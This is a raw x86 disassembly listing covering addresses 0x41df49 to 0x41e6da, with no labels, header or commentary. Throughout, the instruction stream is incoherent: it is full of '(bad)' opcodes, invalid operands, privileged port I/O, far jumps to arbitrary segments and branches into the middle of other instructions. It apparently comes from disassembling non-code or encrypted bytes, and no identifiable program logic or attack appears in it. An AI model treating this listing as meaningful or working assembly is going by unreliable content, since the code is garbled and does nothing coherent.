  41df49:	adc    DWORD PTR [edi-0x8],ebx
  41df4c:	and    ecx,0x20
  41df4f:	sbb    cl,BYTE PTR [ecx+0x2ae22e19]
  41df55:	xor    bl,BYTE PTR [esi]
  41df57:	sbb    al,0xb1
  41df59:	xchg   DWORD PTR [ebx+0x71],esi
  41df5c:	mov    edx,0xfc9005a6
  41df61:	rol    edx,0xca
  41df64:	pop    ebx
  41df65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df66:	stc    
  41df67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df68:	cmc    
  41df69:	xor    al,0xfc
  41df6b:	sub    eax,esp
  41df6d:	scas   al,BYTE PTR es:[edi]
  41df6e:	mov    DWORD PTR [edi+0x4ab2a5ab],0x1bba0797
  41df78:	test   eax,0x99ff63be
  41df7d:	(bad)  
  41df7e:	cmp    bl,bh
  41df80:	or     DWORD PTR [eax-0x10],ebp
  41df83:	or     BYTE PTR [ebx+0x5ed00f4c],al
  41df89:	mov    esi,0xdf83e187
  41df8e:	aas    
  41df8f:	out    dx,eax
  41df90:	repnz scas eax,DWORD PTR es:[edi]
  41df92:	jno    0x41df69
  41df94:	push   ss
  41df95:	fisttp WORD PTR [eax+0x2ebdbd7e]
  41df9b:	xchg   esp,eax
  41df9c:	fsubr  QWORD PTR [eax-0x7200ef0f]
  41dfa2:	fst    QWORD PTR [eax]
  41dfa4:	push   cs
  41dfa5:	fdivr  st,st(2)
  41dfa7:	loop   0x41e01f
  41dfa9:	std    
  41dfaa:	add    bh,al
  41dfac:	loopne 0x41df5d
  41dfae:	stos   BYTE PTR es:[edi],al
  41dfaf:	inc    ebp
  41dfb0:	shr    BYTE PTR [ebp+0x55ef7f66],cl
  41dfb6:	hlt    
  41dfb7:	dec    eax
  41dfb8:	rcr    BYTE PTR [ebx+0x7],0xea
  41dfbc:	(bad)  
  41dfbd:	repnz cs inc ebp
  41dfc0:	xchg   esp,eax
  41dfc1:	and    esi,DWORD PTR [ebp-0x1]
  41dfc4:	pop    edx
  41dfc5:	and    ch,ch
  41dfc7:	mov    al,0xfb
  41dfc9:	mov    ebx,0x5e0a0a9f
  41dfce:	mov    ch,BYTE PTR [ecx+0xf16829]
  41dfd4:	pop    eax
  41dfd5:	xor    al,BYTE PTR [ebp+eiz*2-0x35]
  41dfd9:	(bad)  
  41dfdb:	add    al,0x6c
  41dfdd:	mov    al,0xad
  41dfdf:	popf   
  41dfe0:	pop    es
  41dfe1:	jge    0x41e051
  41dfe3:	cmc    
  41dfe4:	sub    eax,edx
  41dfe6:	push   esi
  41dfe7:	pop    ecx
  41dfe8:	xor    eax,0x2066d0e8
  41dfed:	add    ebx,DWORD PTR [edi-0x119378c4]
  41dff3:	xor    BYTE PTR [ebx+0x5f],dh
  41dff6:	xchg   esi,eax
  41dff7:	mov    bl,0x4
  41dff9:	add    DWORD PTR [ebx+0x6f],0x369b087b
  41e000:	mov    esi,0x17a462ea
  41e005:	jno    0x41e00e
  41e007:	loopne 0x41dffe
  41e009:	lods   al,BYTE PTR ds:[esi]
  41e00a:	dec    esp
  41e00b:	nop
  41e00c:	(bad)  
  41e00e:	jbe    0x41e060
  41e010:	push   ebx
  41e011:	add    eax,0x58223881
  41e016:	xchg   ecx,eax
  41e017:	pop    ebp
  41e018:	xchg   esi,eax
  41e01a:	cld    
  41e01b:	mov    ebp,esp
  41e01d:	ins    BYTE PTR es:[edi],dx
  41e01e:	add    eax,0xccdf75f4
  41e023:	hlt    
  41e024:	inc    ecx
  41e025:	sub    al,0xc5
  41e027:	js     0x41e04a
  41e029:	xchg   ebx,eax
  41e02a:	pop    ebp
  41e02b:	fmul   QWORD PTR [edx+edx*8+0x76b22596]
  41e032:	adc    al,BYTE PTR [ebp+0x37346307]
  41e038:	jg     0x41e09b
  41e03a:	push   ds
  41e03b:	stc    
  41e03c:	add    eax,DWORD PTR [edx-0x75046dba]
  41e042:	test   eax,0x356d9c75
  41e047:	lods   al,BYTE PTR gs:[esi]
  41e049:	sbb    al,BYTE PTR [ecx-0x79]
  41e04c:	mov    eax,ds:0x848b4d12
  41e051:	adc    esi,DWORD PTR [ecx+0x6a84189b]
  41e057:	cli    
  41e058:	mov    dh,0x44
  41e05a:	push   eax
  41e05b:	cli    
  41e05c:	cmp    al,0x7e
  41e05e:	jb     0x41e010
  41e060:	jnp    0x41e056
  41e062:	fnsave [esi+0x52bd5368]
  41e068:	and    al,0x44
  41e06a:	and    al,BYTE PTR [edx]
  41e06c:	or     cl,0xe8
  41e06f:	and    eax,0x4511e85
  41e074:	jo     0x41e08b
  41e076:	pop    ds
  41e077:	int    0x37
  41e079:	cmp    DWORD PTR [ebp+0x6f5b9a65],0x2052ccb2
  41e083:	cmp    DWORD PTR [esi],esp
  41e085:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e086:	ins    BYTE PTR es:[edi],dx
  41e087:	xor    BYTE PTR [ebx+0x7ca8e793],bl
  41e08d:	cdq    
  41e08e:	int3   
  41e08f:	add    eax,0xf33b2fde
  41e094:	mov    al,ds:0xc388877e
  41e099:	out    0xcf,eax
  41e09b:	imul   eax,DWORD PTR [edx],0xfffffff4
  41e09e:	lds    ebp,FWORD PTR [edx+edi*4-0x1336b039]
  41e0a5:	mov    edx,DWORD PTR [edi-0x7b]
  41e0a8:	test   DWORD PTR [ebx-0x7e2b47bb],0xa16ee3df
  41e0b2:	push   ecx
  41e0b3:	pop    ss
  41e0b4:	inc    edx
  41e0b5:	pop    esp
  41e0b6:	(bad)  
  41e0b7:	xchg   ebp,eax
  41e0b8:	sar    BYTE PTR [ecx],cl
  41e0ba:	(bad)  
  41e0bb:	mov    BYTE PTR [esi-0x2d],ch
  41e0be:	dec    ebp
  41e0bf:	jbe    0x41e060
  41e0c1:	mov    bl,0xe8
  41e0c3:	or     al,0x34
  41e0c5:	mov    eax,0xe3f71aae
  41e0ca:	int    0x53
  41e0cc:	mov    BYTE PTR [ecx+0x10],dh
  41e0cf:	mov    ch,0x15
  41e0d1:	fldenv [edx]
  41e0d3:	push   ds
  41e0d4:	in     eax,0xd1
  41e0d6:	loopne 0x41e155
  41e0d8:	push   esp
  41e0d9:	pop    esi
  41e0da:	dec    ebp
  41e0db:	push   ebx
  41e0dc:	add    ah,BYTE PTR [edi]
  41e0de:	jmp    0x3b31f2e8
  41e0e3:	cmp    eax,0x597e299d
  41e0e8:	jns    0x41e072
  41e0ea:	mov    ecx,0xcd539513
  41e0ef:	cmp    dh,BYTE PTR [eax+0x47]
  41e0f2:	fistp  QWORD PTR [ecx+edi*1]
  41e0f5:	out    dx,eax
  41e0f6:	add    al,0x11
  41e0f8:	push   0x44
  41e0fa:	and    al,0xf5
  41e0fc:	es push ebp
  41e0fe:	or     dl,bl
  41e100:	out    0xd6,eax
  41e102:	sub    ecx,DWORD PTR [edx]
  41e104:	shl    esi,cl
  41e106:	fdiv   QWORD PTR [esi+ebp*8+0x51]
  41e10a:	pop    esi
  41e10b:	cmp    esi,ebx
  41e10d:	outs   dx,DWORD PTR ds:[esi]
  41e10e:	ret    
  41e10f:	jno    0x41e117
  41e111:	inc    esp
  41e112:	xor    al,0x76
  41e114:	mov    ebp,0x21f941da
  41e119:	inc    dx
  41e11b:	xchg   ebx,eax
  41e11c:	rol    BYTE PTR [ecx+ecx*8+0x29],1
  41e120:	push   edi
  41e121:	leave  
  41e122:	je     0x41e138
  41e124:	nop
  41e125:	jle    0x41e135
  41e127:	pop    ebx
  41e128:	xor    al,0x5c
  41e12a:	jmp    0x510e:0xa881e251
  41e131:	xor    al,0x2e
  41e133:	adc    eax,ebx
  41e135:	nop
  41e136:	mov    ds:0xb66652c3,al
  41e13b:	jne    0x41e19c
  41e13d:	mov    al,ds:0xc9ca848e
  41e142:	ret    0x775f
  41e145:	add    al,BYTE PTR [edx+edx*8]
  41e148:	jno    0x41e16a
  41e14a:	jl     0x41e11c
  41e14c:	mov    ebx,0x6814c453
  41e151:	jmp    0x54d5fb20
  41e156:	adc    edi,edx
  41e158:	dec    eax
  41e159:	idiv   BYTE PTR [edx-0x207476e9]
  41e15f:	stos   DWORD PTR es:[edi],eax
  41e160:	cmp    eax,0x45d23550
  41e165:	mov    bl,0x80
  41e167:	es or  dh,bl
  41e16a:	cmc    
  41e16b:	push   edi
  41e16c:	scas   eax,DWORD PTR es:[edi]
  41e16d:	fmul   QWORD PTR [edi+0x2e]
  41e170:	das    
  41e171:	sti    
  41e172:	mov    al,0x9
  41e174:	call   edi
  41e176:	adc    DWORD PTR [ebp-0x4e7b48ef],ebp
  41e17c:	mov    ds:0xc2041fb,al
  41e181:	jno    0x41e153
  41e183:	cld    
  41e184:	rcr    DWORD PTR [ebp+edi*2-0x34],0x57
  41e189:	push   ecx
  41e18a:	mov    dl,BYTE PTR [eax+0x3798e5e8]
  41e190:	jae    0x41e19c
  41e192:	lods   eax,DWORD PTR ds:[esi]
  41e193:	ret    
  41e194:	jo     0x41e141
  41e196:	test   DWORD PTR [ebx+0x437f5988],edx
  41e19c:	cmp    al,0x11
  41e19e:	push   0x76
  41e1a0:	xchg   DWORD PTR [esi],edx
  41e1a2:	or     eax,0xcb670fad
  41e1a7:	scas   al,BYTE PTR es:[edi]
  41e1a8:	mov    ah,0xfc
  41e1aa:	add    eax,0xf0006bdc
  41e1af:	adc    edx,0xe11f1fc9
  41e1b5:	leave  
  41e1b6:	clc    
  41e1b7:	in     al,dx
  41e1b8:	jmp    0x41e1fc
  41e1ba:	and    eax,DWORD PTR [ecx]
  41e1bc:	repnz in al,dx
  41e1be:	shr    DWORD PTR [eax],0x23
  41e1c1:	call   0xecc1:0x20924b8e
  41e1c8:	cs je  0x41e1fd
  41e1cb:	mov    esp,0x78dc4cb3
  41e1d0:	test   eax,0x89aa2671
  41e1d5:	and    al,0x85
  41e1d7:	aam    0x83
  41e1d9:	test   al,0xb2
  41e1db:	(bad)  
  41e1dc:	sbb    BYTE PTR [eax-0x54],al
  41e1df:	leave  
  41e1e0:	pop    ebx
  41e1e1:	cmp    al,0x36
  41e1e3:	mov    esp,0x995947d7
  41e1e8:	ss retf 
  41e1ea:	icebp  
  41e1eb:	jmp    0xef6d39d5
  41e1f0:	push   es
  41e1f1:	cmp    esp,DWORD PTR [eax+0x17e1c77e]
  41e1f7:	fadd   DWORD PTR [esi-0x7a]
  41e1fa:	xchg   DWORD PTR [esi],ecx
  41e1fc:	pusha  
  41e1fd:	jp     0x41e233
  41e1ff:	rcr    BYTE PTR [esi+eax*8+0x3e],0x49
  41e204:	add    al,0x50
  41e206:	sahf   
  41e207:	mov    fs,WORD PTR [edx+ebx*4+0x2a]
  41e20b:	or     BYTE PTR [ecx],al
  41e20d:	jmp    0x41e1f6
  41e20f:	lahf   
  41e210:	cmp    DWORD PTR [ebp+0x218ea908],esi
  41e216:	xlat   BYTE PTR ds:[ebx]
  41e217:	push   es
  41e218:	xor    eax,0xbaaaa325
  41e21d:	rol    BYTE PTR [ecx+0x73cc3d5b],0x49
  41e224:	sahf   
  41e225:	out    dx,eax
  41e226:	jmp    0x41e231
  41e228:	ret    0xd5b2
  41e22b:	mov    BYTE PTR [ebx-0x88d3fbe],ch
  41e231:	mov    esi,0xa4176045
  41e236:	xchg   edi,eax
  41e237:	xor    al,0x6
  41e239:	cmp    ebp,DWORD PTR [eax]
  41e23b:	jp     0x41e1d6
  41e23d:	dec    eax
  41e23e:	aas    
  41e23f:	push   cs
  41e240:	pop    ebp
  41e241:	adc    DWORD PTR [ebx-0x59],edi
  41e244:	inc    BYTE PTR [eax-0x6cfb3dac]
  41e24a:	lods   al,BYTE PTR ds:[esi]
  41e24b:	push   eax
  41e24c:	bnd jb 0x41e29c
  41e24f:	xor    al,0xa7
  41e251:	pop    es
  41e252:	jmp    0xf71910f3
  41e257:	ret    0xce68
  41e25a:	aad    0x30
  41e25c:	mov    ah,0x21
  41e25e:	mov    BYTE PTR [ecx+0x7e],al
  41e261:	mov    ch,0x85
  41e263:	fs call 0xe36f500c
  41e269:	das    
  41e26a:	cmp    al,BYTE PTR [eax+esi*1+0x4c559fee]
  41e271:	inc    ebx
  41e272:	xor    al,0xc4
  41e274:	mov    dl,BYTE PTR [eax]
  41e276:	leave  
  41e277:	inc    ebx
  41e278:	leave  
  41e279:	mov    al,0x11
  41e27b:	xor    dl,dh
  41e27d:	jp     0x41e227
  41e27f:	mov    ecx,0xfc4816ee
  41e284:	stc    
  41e285:	pop    es
  41e286:	dec    eax
  41e287:	lods   al,BYTE PTR ds:[esi]
  41e288:	ins    DWORD PTR es:[edi],dx
  41e289:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e28a:	mov    ch,0xcd
  41e28c:	cmc    
  41e28d:	or     esp,DWORD PTR [edx-0x50]
  41e290:	scas   al,BYTE PTR es:[edi]
  41e291:	out    0x4c,al
  41e293:	cdq    
  41e294:	js     0x41e2e1
  41e296:	mov    esp,0xaef6f4f0
  41e29b:	mov    ds:0xbea66146,eax
  41e2a0:	xor    ah,bl
  41e2a2:	sbb    BYTE PTR [esi-0x36a8bd5a],al
  41e2a8:	dec    eax
  41e2a9:	cdq    
  41e2aa:	push   ss
  41e2ab:	jne    0x41e27a
  41e2ad:	dec    edx
  41e2ae:	gs dec esp
  41e2b0:	es push esi
  41e2b2:	xchg   ebx,eax
  41e2b3:	out    dx,al
  41e2b4:	dec    eax
  41e2b5:	mov    ch,0x47
  41e2b7:	retf   0xb048
  41e2ba:	ror    BYTE PTR [ecx-0x7adca7f0],0x9f
  41e2c1:	fadd   QWORD PTR [edi+0x172e224c]
  41e2c7:	jns    0x41e2b9
  41e2c9:	cmp    DWORD PTR es:[ebp+0x26],ebx
  41e2cd:	push   eax
  41e2ce:	popf   
  41e2cf:	enter  0x40ae,0x24
  41e2d3:	dec    ebx
  41e2d4:	test   al,0x1
  41e2d6:	jne    0x41e31f
  41e2d8:	loope  0x41e270
  41e2da:	shl    BYTE PTR [eax+0x4c0e33bf],cl
  41e2e0:	xchg   ecx,eax
  41e2e1:	mov    esp,edx
  41e2e3:	jbe    0x41e26e
  41e2e5:	js     0x41e2e7
  41e2e7:	sbb    BYTE PTR [edi+ebx*1-0x3],ah
  41e2eb:	ins    BYTE PTR es:[edi],dx
  41e2ec:	jecxz  0x41e2a6
  41e2ee:	sbb    al,0x34
  41e2f0:	mov    al,0xef
  41e2f2:	call   0xe752:0x98922099
  41e2f9:	inc    eax
  41e2fa:	stc    
  41e2fb:	mov    cl,0x2c
  41e2fd:	pop    eax
  41e2ff:	aaa    
  41e300:	ret    0x8180
  41e303:	(bad)  
  41e304:	sar    BYTE PTR [ecx-0x2db0321d],1
  41e30a:	push   edx
  41e30b:	sahf   
  41e30c:	sbb    ecx,DWORD PTR [ebx]
  41e30e:	in     eax,0x16
  41e310:	jbe    0x41e2af
  41e312:	je     0x41e310
  41e314:	cmp    edx,eax
  41e316:	and    al,0xfa
  41e318:	cmp    DWORD PTR [edx+eax*2-0x61c8ffbd],0xffffffad
  41e320:	push   ebx
  41e321:	jo     0x41e2ad
  41e323:	mov    fs,WORD PTR [ebp-0x52]
  41e326:	sub    eax,0xf78d25c7
  41e32b:	cs out 0x47,eax
  41e32e:	repnz jmp 0xdbdf:0xee2630ed
  41e336:	clc    
  41e337:	xchg   ecx,eax
  41e338:	xchg   ebx,eax
  41e339:	xchg   esi,eax
  41e33a:	adc    dh,dl
  41e33c:	xlat   BYTE PTR ds:[ebx]
  41e33d:	push   esi
  41e33e:	call   FWORD PTR [edi+ebp*4-0x17]
  41e342:	mov    ds:0xd5bfb6eb,al
  41e347:	xor    DWORD PTR [ecx+0x35],edx
  41e34a:	fimul  WORD PTR [eax+edi*1+0x7dc21612]
  41e351:	loopne 0x41e325
  41e353:	and    ebx,esi
  41e355:	loop   0x41e34f
  41e357:	dec    esp
  41e358:	in     al,dx
  41e359:	push   es
  41e35a:	mov    ecx,0x48a5c884
  41e35f:	das    
  41e360:	inc    ebp
  41e361:	rol    DWORD PTR [ebp-0x17],1
  41e364:	mov    dh,0xd5
  41e366:	sahf   
  41e367:	es clc 
  41e369:	or     ebx,DWORD PTR [eax+0x5d]
  41e36c:	push   es
  41e36d:	lock (bad) 
  41e36f:	sbb    bh,dh
  41e371:	leave  
  41e372:	bound  ebx,QWORD PTR [ebx]
  41e374:	adc    ebx,esi
  41e376:	inc    ebp
  41e377:	(bad)  
  41e378:	je     0x41e381
  41e37a:	jae    0x41e3d3
  41e37c:	retf   
  41e37d:	add    BYTE PTR [ecx+0x64],cl
  41e380:	enter  0x4d86,0x23
  41e384:	inc    ebp
  41e385:	add    al,cl
  41e387:	and    DWORD PTR [ebx-0x731441f6],ebp
  41e38d:	sbb    BYTE PTR [esi+0x3574e076],cl
  41e393:	xchg   ebp,eax
  41e394:	ret    0x1c94
  41e397:	push   eax
  41e398:	inc    edi
  41e399:	clc    
  41e39a:	xchg   esi,eax
  41e39b:	(bad)  
  41e39c:	in     al,dx
  41e39d:	jnp    0x41e32b
  41e39f:	push   eax
  41e3a0:	jmp    0x41e388
  41e3a2:	xchg   DWORD PTR [ebx],ebx
  41e3a4:	dec    esp
  41e3a5:	push   ds
  41e3a6:	mov    dh,0x3f
  41e3a8:	mov    eax,ds:0x29c891f5
  41e3ad:	adc    eax,0x736b163d
  41e3b2:	fmul   DWORD PTR [ebp+0x6c73e5df]
  41e3b8:	sbb    edx,DWORD PTR [esi+0x9025a3d]
  41e3be:	jne    0x41e3e5
  41e3c0:	push   es
  41e3c1:	mov    ebx,0x793073a3
  41e3c6:	xlat   BYTE PTR ds:[ebx]
  41e3c7:	fild   QWORD PTR [ebp+0x9405583]
  41e3cd:	xchg   ecx,eax
  41e3ce:	out    dx,eax
  41e3cf:	mov    ch,0x67
  41e3d1:	jne    0x41e430
  41e3d3:	rcr    BYTE PTR [eax+0x5cacd688],cl
  41e3d9:	cmp    ah,BYTE PTR [edx]
  41e3db:	xchg   ecx,eax
  41e3dc:	mov    edi,0x41c66e9c
  41e3e1:	repz ret 
  41e3e3:	cmp    BYTE PTR [ecx],bl
  41e3e5:	cmp    edx,DWORD PTR [eax+eax*1-0x6b]
  41e3e9:	mov    esp,0x63a214a9
  41e3ee:	stos   BYTE PTR es:[edi],al
  41e3ef:	xchg   ecx,eax
  41e3f0:	retf   
  41e3f1:	cmp    BYTE PTR [edx+0x7e],ch
  41e3f4:	mov    ds:0x2fd9525f,eax
  41e3f9:	xor    cl,BYTE PTR [ecx]
  41e3fb:	sub    al,0x63
  41e3fd:	fst    QWORD PTR [edi]
  41e3ff:	fisub  DWORD PTR [edi+0x7c74fe91]
  41e405:	(bad)  
  41e406:	mov    ah,BYTE PTR es:[edx+0x438fe868]
  41e40d:	(bad)  
  41e40e:	jno    0x41e3c4
  41e410:	mov    ecx,0x27c35677
  41e415:	mov    dl,al
  41e417:	pop    eax
  41e418:	or     esi,esi
  41e41a:	dec    edx
  41e41b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e41c:	iret   
  41e41d:	mov    ah,0xf4
  41e41f:	jbe    0x41e429
  41e421:	ja     0x41e423
  41e423:	enter  0x6fbe,0xc
  41e427:	cmp    eax,0x83a41e50
  41e42c:	cmc    
  41e42d:	test   ecx,ecx
  41e42f:	xor    dh,BYTE PTR ss:[esi+0x7fb2fdf3]
  41e436:	pushf  
  41e437:	ja     0x41e449
  41e439:	jno    0x41e490
  41e43b:	test   BYTE PTR [ebx+0x26],0x1b
  41e43f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e440:	mov    al,0xc5
  41e442:	call   0xec2e:0xe2e941d2
  41e449:	sbb    ch,ah
  41e44b:	(bad)  
  41e44c:	mov    al,ds:0x806c72e1
  41e451:	sti    
  41e452:	test   al,0x96
  41e454:	fwait
  41e455:	sar    cl,1
  41e457:	js     0x41e41b
  41e459:	cmp    eax,0x82b3cf6e
  41e45e:	sbb    DWORD PTR [esi-0x24108ccf],0x60fcd672
  41e468:	in     al,0xf3
  41e46a:	retf   
  41e46b:	ret    
  41e46c:	cdq    
  41e46d:	xor    ah,bl
  41e46f:	cmc    
  41e470:	data16 jp 0x41e4ce
  41e473:	out    dx,al
  41e474:	fwait
  41e475:	mov    ds:0x695c30ab,eax
  41e47a:	loopne 0x41e4da
  41e47c:	mov    esi,0x1aab7d5e
  41e481:	dec    esp
  41e482:	push   ds
  41e483:	mov    ch,0x98
  41e485:	imul   esi,ecx,0x5d
  41e488:	add    al,BYTE PTR fs:[ebp-0x32]
  41e48c:	inc    esi
  41e48d:	outs   dx,BYTE PTR ds:[esi]
  41e48e:	ficomp DWORD PTR [ecx+0x2d]
  41e492:	and    ch,BYTE PTR [esi-0x5a8273f5]
  41e498:	sti    
  41e499:	jo     0x41e478
  41e49b:	or     dh,dl
  41e49d:	pop    ebp
  41e49e:	into   
  41e49f:	mov    cl,0xa
  41e4a1:	or     eax,0x682f1576
  41e4a6:	push   esp
  41e4a7:	dec    edi
  41e4a8:	outs   dx,DWORD PTR ds:[esi]
  41e4a9:	adc    ebx,edx
  41e4ab:	jge    0x41e51e
  41e4ad:	dec    edi
  41e4ae:	fcomp  DWORD PTR [edi]
  41e4b0:	imul   ebx,esi,0x3aadb270
  41e4b6:	pop    eax
  41e4b7:	mov    esp,0x4733e9f6
  41e4bc:	push   esi
  41e4bd:	pop    ss
  41e4be:	cdq    
  41e4bf:	(bad)  
  41e4c0:	xchg   edx,eax
  41e4c1:	pushf  
  41e4c2:	nop
  41e4c3:	xor    BYTE PTR [ebp+esi*8+0x313bb976],cl
  41e4ca:	dec    ebx
  41e4cb:	jp     0x41e502
  41e4cd:	in     al,0xa5
  41e4cf:	push   ss
  41e4d0:	or     DWORD PTR [eax+0x1a],ebp
  41e4d3:	mov    BYTE PTR [edx+eax*4+0x25],dl
  41e4d7:	test   edi,edi
  41e4d9:	sbb    edx,DWORD PTR [ebx+eax*8+0x6a]
  41e4dd:	jne    0x41e497
  41e4df:	(bad)  
  41e4e0:	mov    WORD PTR [ebx+ebx*1-0x6d],ds
  41e4e4:	jmp    0xe7d4:0xfc31eae
  41e4eb:	mov    dh,BYTE PTR [esi+0x54c72c09]
  41e4f1:	xchg   esp,eax
  41e4f2:	arpl   WORD PTR [eax*1+0x4d670d82],di
  41e4f9:	pop    es
  41e4fa:	add    BYTE PTR [edi-0x3a801d5],ch
  41e500:	stos   DWORD PTR es:[edi],eax
  41e501:	and    bl,BYTE PTR [edi+0x27528695]
  41e507:	sub    al,0x4d
  41e509:	xchg   edx,eax
  41e50a:	jmp    0x41e547
  41e50c:	xor    ah,BYTE PTR [ebp-0x5209a5a3]
  41e512:	mov    esi,0xe2cf2329
  41e517:	out    dx,eax
  41e518:	(bad)  
  41e519:	loopne 0x41e55e
  41e51b:	pop    eax
  41e51c:	inc    DWORD PTR ds:0x8096e899
  41e522:	mov    al,ds:0xa7b6b3ec
  41e527:	push   cs
  41e528:	ret    
  41e529:	fadd   QWORD PTR ds:0x59dd1ea2
  41e52f:	xlat   BYTE PTR ds:[ebx]
  41e530:	(bad)  
  41e531:	push   cs
  41e532:	stos   DWORD PTR es:[edi],eax
  41e533:	dec    ebx
  41e534:	mov    eax,ds:0x2c4da392
  41e539:	retf   0x2d08
  41e53c:	adc    DWORD PTR [edi-0xa],0xf2a6dea2
  41e543:	push   edx
  41e544:	pop    ecx
  41e545:	(bad)  
  41e546:	mov    dl,0xf7
  41e548:	and    eax,0xcf9c15f2
  41e54d:	and    eax,0x4cf035d8
  41e552:	fcmovbe st,st(3)
  41e554:	out    dx,eax
  41e555:	mov    eax,0x9bc17711
  41e55a:	sbb    eax,ebx
  41e55c:	in     eax,0xec
  41e55e:	fwait
  41e55f:	pop    esi
  41e560:	cmp    ebp,ecx
  41e562:	pop    esi
  41e563:	push   0xae4e9779
  41e568:	daa    
  41e569:	scas   al,BYTE PTR es:[edi]
  41e56a:	lods   al,BYTE PTR ds:[esi]
  41e56b:	add    edi,DWORD PTR [edi+esi*1]
  41e56e:	aas    
  41e56f:	minps  xmm5,xmm7
  41e572:	addr16 mov esp,fs
  41e575:	pop    edi
  41e576:	fadd   QWORD PTR [ebp-0x2b]
  41e579:	sbb    al,0x6e
  41e57b:	mov    bh,0x1a
  41e57d:	and    eax,0x4c7a93c9
  41e582:	mul    DWORD PTR [ecx+0x2625a6ef]
  41e588:	push   0x38
  41e58a:	jmp    0x662a:0xe4f3be06
  41e591:	and    eax,0xd167dec4
  41e596:	mov    BYTE PTR [eax-0x64],cl
  41e599:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e59a:	cmp    DWORD PTR ds:0xd8bfb235,edx
  41e5a0:	mov    eax,ds:0x53459f5e
  41e5a5:	outs   dx,BYTE PTR ds:[esi]
  41e5a6:	inc    esp
  41e5a7:	dec    DWORD PTR [eax+0x15f39c4f]
  41e5ad:	mov    ?,WORD PTR [eax]
  41e5af:	lds    esp,FWORD PTR [edi-0x36]
  41e5b2:	xor    BYTE PTR [esi-0x2c],bl
  41e5b5:	sub    al,0x96
  41e5b7:	out    dx,al
  41e5b8:	out    dx,eax
  41e5b9:	and    al,0x19
  41e5bb:	jae    0x41e57a
  41e5bd:	into   
  41e5be:	mov    esp,0x50effe35
  41e5c3:	bound  ecx,QWORD PTR [esp+ebx*2-0x1c4481ad]
  41e5ca:	imul   BYTE PTR [ebx-0x4bf10486]
  41e5d0:	inc    edi
  41e5d1:	dec    ecx
  41e5d2:	std    
  41e5d3:	lock aam 0x87
  41e5d6:	pushf  
  41e5d7:	pop    es
  41e5d8:	test   DWORD PTR [eax+0x6e],ebp
  41e5db:	xor    BYTE PTR [eax],bh
  41e5dd:	jmp    0x41e617
  41e5df:	xor    DWORD PTR [eax],eax
  41e5e1:	fxch   st(5)
  41e5e3:	mov    ch,0xcf
  41e5e5:	cmc    
  41e5e6:	fst    QWORD PTR [eax-0x15]
  41e5e9:	aad    0x22
  41e5eb:	cli    
  41e5ec:	data16 (bad) 
  41e5ee:	dec    edx
  41e5ef:	mov    ds:0x25efda17,al
  41e5f4:	test   eax,0x9a7ffb50
  41e5f9:	cld    
  41e5fa:	mov    ebp,0x6a0c97b7
  41e5ff:	cmp    dl,BYTE PTR [ecx]
  41e601:	push   0xb5c267cd
  41e606:	mov    ecx,0x44fd8e04
  41e60b:	daa    
  41e60c:	cmc    
  41e60d:	jge    0x41e5d7
  41e60f:	inc    ecx
  41e610:	or     al,0x3f
  41e612:	call   0x3096:0x711ba9b2
  41e619:	ret    
  41e61a:	mov    ebx,?
  41e61c:	xchg   edi,eax
  41e61d:	jmp    0x30edda0d
  41e622:	sahf   
  41e623:	pop    ebp
  41e624:	int    0x8e
  41e626:	loope  0x41e66e
  41e628:	sbb    al,dl
  41e62a:	pusha  
  41e62b:	popf   
  41e62c:	stc    
  41e62d:	aaa    
  41e62e:	repz sub BYTE PTR [edi-0x1801e466],cl
  41e635:	push   ds
  41e636:	ja     0x41e62e
  41e638:	ins    BYTE PTR es:[edi],dx
  41e639:	into   
  41e63a:	test   BYTE PTR [ebx],0xc9
  41e63d:	sbb    eax,0x3ff410c9
  41e642:	mov    bl,0xbe
  41e644:	aaa    
  41e645:	enter  0xe608,0x2c
  41e649:	push   edx
  41e64a:	xlat   BYTE PTR ds:[ebx]
  41e64b:	push   ebp
  41e64c:	out    0xf1,eax
  41e64e:	(bad)  
  41e64f:	out    dx,eax
  41e650:	sub    DWORD PTR [ebx-0x783d738d],esp
  41e656:	ficomp WORD PTR [edx-0x3f566059]
  41e65c:	retf   0xff43
  41e65f:	cmp    eax,DWORD PTR [edx]
  41e661:	sti    
  41e662:	lods   eax,DWORD PTR ds:[esi]
  41e663:	cmp    ch,BYTE PTR [edi]
  41e665:	lahf   
  41e666:	mov    eax,ds:0x246f55a0
  41e66b:	jns    0x41e621
  41e66d:	leave  
  41e66e:	sahf   
  41e66f:	(bad)  
  41e670:	mov    esi,0x70c049ed
  41e675:	sub    eax,0x27c65f58
  41e67a:	je     0x41e64b
  41e67c:	ret    
  41e67d:	lahf   
  41e67e:	push   ds
  41e67f:	xor    DWORD PTR [esi+0x62],ebx
  41e682:	jno    0x41e6a4
  41e684:	or     eax,0x7abd832e
  41e689:	push   esi
  41e68a:	aaa    
  41e68b:	call   0x6264b0a3
  41e690:	sahf   
  41e691:	mov    al,0x5f
  41e693:	and    BYTE PTR [edx+eax*2],bl
  41e696:	push   ebx
  41e697:	enter  0xe447,0x3f
  41e69b:	dec    bp
  41e69d:	(bad)  
  41e69e:	add    esp,DWORD PTR [edx-0x2]
  41e6a1:	lods   eax,DWORD PTR ds:[esi]
  41e6a2:	call   DWORD PTR [edx]
  41e6a4:	fs push esp
  41e6a6:	(bad)  
  41e6a7:	cmp    al,0xf5
  41e6a9:	hlt    
  41e6aa:	inc    esp
  41e6ab:	in     eax,dx
  41e6ac:	add    edi,DWORD PTR [esi-0x39]
  41e6af:	xor    BYTE PTR [ebx],dh
  41e6b1:	jno    0x41e640
  41e6b3:	xchg   DWORD PTR [ebx-0x6e],ecx
  41e6b6:	push   ss
  41e6b7:	ja     0x41e728
  41e6b9:	adc    DWORD PTR [edx],edi
  41e6bb:	(bad)  
  41e6bc:	push   ss
  41e6bd:	js     0x41e68a
  41e6bf:	popa   
  41e6c0:	and    esi,ebp
  41e6c2:	sbb    ebx,esp
  41e6c4:	inc    esi
  41e6c5:	and    edi,DWORD PTR [edi+0x1]
  41e6c8:	and    DWORD PTR [ebx],ecx
  41e6ca:	call   0xa9a19b20
  41e6cf:	mov    bh,BYTE PTR [ebp-0x7596b681]
  41e6d5:	test   al,0xca
  41e6d7:	mov    cl,0x1
  41e6d9:	das    
  41e6da:	sub    esi,ebp
